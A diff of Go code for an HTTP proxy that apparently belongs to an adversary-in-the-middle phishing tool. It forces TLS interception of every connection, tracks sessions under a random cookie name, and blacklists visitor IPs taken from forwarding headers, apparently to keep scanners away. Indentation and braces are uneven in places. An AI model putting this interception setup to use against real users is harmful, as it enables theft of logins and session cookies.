@@ -122,29 +122,35 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
-
-	// Configure HTTP server with timeouts
+        // Configure HTTP server with timeouts
 	p.Server = &http.Server{
-		Addr:         fmt.Sprintf("%s:%d", hostname, port),
-		Handler:      p.Proxy,
-		ReadTimeout:  30 * time.Second,
-		WriteTimeout: 30 * time.Second,
-		IdleTimeout:  120 * time.Second,
-		TLSConfig: &tls.Config{
-			MinVersion: tls.VersionTLS12,
-			CipherSuites: []uint16{
-				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
-				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
-			},
-			NextProtos: []string{"h2", "http/1.1"},
-		},
-	}
+	Addr:         fmt.Sprintf("%s:%d", hostname, port),
+	Handler:      p.Proxy,
+	ReadTimeout:  30 * time.Second,
+	WriteTimeout: 30 * time.Second,
+	IdleTimeout:  120 * time.Second,
+	TLSConfig: &tls.Config{
+		MinVersion: tls.VersionTLS12,
+		CipherSuites: []uint16{
+			// AES-128 GCM for older but secure clients
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
 
-	// Configure proxy settings
+			// AES-256 GCM for stronger modern security
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+
+			// ChaCha20-Poly1305 for devices without AES hardware acceleration
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+		},
+		NextProtos: []string{"h2", "http/1.1"},
+	},
+}
+
 	if cfg.proxyConfig.Enabled {
-		if err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password); err != nil {
+		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
+		if err != nil {
 			log.Error("proxy: %v", err)
 			cfg.EnableProxy(false)
 		} else {
@@ -152,24 +158,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 	}
 
-	// Initialize session tracking
-	p.cookieName = strings.ToLower(GenRandomString(8))
+	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
-	// Configure proxy behavior
 	p.Proxy.Verbose = false
+
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
 		req.URL.Scheme = "https"
 		req.URL.Host = req.Host
 		p.Proxy.ServeHTTP(w, req)
 	})
 
-	// Configure MITM behavior with proper TLS
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
-	p.Proxy.SetTLSConfigFromCA(p.TLSConfigFromCA())
 
-	// Request handling pipeline
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 			ps := &ProxySession{
@@ -180,24 +182,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				Index:        -1,
 			}
 			ctx.UserData = ps
+			hiblue := color.New(color.FgHiBlue)
 
-			// IP handling with proxy support
+			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+
+			// handle proxy headers
 			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
 			for _, h := range proxyHeaders {
-				if origin_ip := req.Header.Get(h); origin_ip != "" {
+				origin_ip := req.Header.Get(h)
+				if origin_ip != "" {
 					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
 					break
 				}
 			}
 
-			// Blacklist handling
-			if p.cfg.GetBlacklistMode() != "off" && p.bl.IsBlacklisted(from_ip) {
-				if p.bl.IsVerbose() {
-					log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+			if p.cfg.GetBlacklistMode() != "off" {
+				if p.bl.IsBlacklisted(from_ip) {
+					if p.bl.IsVerbose() {
+						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+					}
+					return p.blockRequest(req)
 				}
-				return p.blockRequest(req)
-			}
 				if p.cfg.GetBlacklistMode() == "all" {
 					if !p.bl.IsWhitelisted(from_ip) {
 						err := p.bl.AddIP(from_ip)
